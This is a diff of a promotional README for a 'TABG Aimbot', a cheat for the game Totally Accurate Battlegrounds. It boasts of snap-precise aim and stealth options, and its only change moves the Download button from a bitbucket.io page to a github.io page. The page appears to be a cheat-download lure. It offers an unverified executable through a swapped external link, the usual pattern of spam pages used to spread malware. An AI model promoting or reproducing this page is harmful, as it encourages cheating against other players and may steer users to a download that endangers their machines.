@@ -4,7 +4,7 @@ In *Totally Accurate Battlegrounds* (TABG), nothing is accurate — unless you�
 
 The **TABG Aimbot** turns you into a headshot machine with **snap-precise aim, customizable target zones, smooth tracking, and stealth options**. Whether you want to rage or keep it lowkey, this aimbot has all the features to transform you into a beam-shooting chaos god. ⚡
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://tabg-aimbot.github.io/.github/)
 ---
 
 ## 🔫 What Does the TABG Aimbot Do?
